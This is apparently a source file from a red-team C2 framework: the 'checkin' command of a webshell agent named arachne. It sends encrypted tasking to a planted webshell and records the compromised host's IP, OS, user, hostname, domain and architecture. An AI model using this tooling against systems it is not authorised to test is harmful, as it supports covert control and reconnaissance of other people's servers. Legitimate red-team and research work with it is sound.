from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from arachne.WebshellRPC import WebshellRPC


class CheckinArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class CheckinCommand(CommandBase):
    cmd = "checkin"
    needs_admin = False
    help_cmd = "checkin"
    description = "Get system info from webshell"
    version = 2
    author = "@Airzero24"
    argument_class = CheckinArguments
    attackmapping = []

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True,
        )
        message = "{}|{}|".format(taskData.Task.AgentTaskID,base64.b64encode(self.cmd.encode('UTF8')).decode())
        encrypted_resp = await SendMythicRPCCallbackEncryptBytes(MythicRPCCallbackEncryptBytesMessage(
            AgentCallbackUUID=taskData.Callback.AgentCallbackID,
            Message=message.encode(),
            IncludesUUID=False,
            IsBase64Encoded=False,
            C2Profile="webshell"
        ))
        if encrypted_resp.Success:
            try:
                response_data = await WebshellRPC.GetRequest(taskData.Payload.UUID,
                                                             encrypted_resp.Message,
                                                             taskData)
                if len(response_data) == 0:
                    taskData.args.set_manual_args(message)
                    response.Completed = False
                    response.Success = True
                    return response
                decrypted_resp = await SendMythicRPCCallbackDecryptBytes(MythicRPCCallbackDecryptBytesMessage(
                    AgentCallbackUUID=taskData.Callback.AgentCallbackID,
                    Message=response_data,
                    IncludesUUID=False,
                    IsBase64Encoded=True,
                    C2Profile="webshell"
                ))
                if decrypted_resp.Success:
                    info = decrypted_resp.Message.decode().split('|')
                    await SendMythicRPCCallbackUpdate(MythicRPCCallbackUpdateMessage(
                        AgentCallbackUUID=taskData.Callback.AgentCallbackID,
                        IP=info[1],
                        OS=info[2],
                        User=info[3],
                        Host=info[4],
                        Domain=info[5],
                        PID=int(info[6]),
                        Architecture=info[7]
                    ))
                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                        TaskID=taskData.Task.ID,
                        Response=f"IP: {info[1]}\nOS: {info[2]}\nUser: {info[3]}\nHost: {info[4]}\nDomain: {info[5]}\nPID: {info[6]}\nArch: {info[7]}".encode(),
                    ))
                    response.Success = True
                else:
                    response.TaskStatus = "error: decrypting"
                    response.Error = decrypted_resp.Error
            except Exception as e:
                response.TaskStatus = "error: processing"
                response.Error = str(e)
        else:
            response.TaskStatus = "error: encrypting"
            response.Error = encrypted_resp.Error
        if response.Error != "":
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response.Error.encode(),
            ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        info = response.split('|')
        await SendMythicRPCCallbackUpdate(MythicRPCCallbackUpdateMessage(
            AgentCallbackUUID=task.Callback.AgentCallbackID,
            IP=info[0],
            OS=info[1],
            User=info[2],
            Host=info[3],
            Domain=info[4],
            PID=int(info[5]),
            Architecture=info[6]
        ))
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=f"IP: {info[0]}\nOS: {info[1]}\nUser: {info[2]}\nHost: {info[3]}\nDomain: {info[4]}\nPID: {info[5]}\nArch: {info[6]}".encode(),
        ))
        return resp
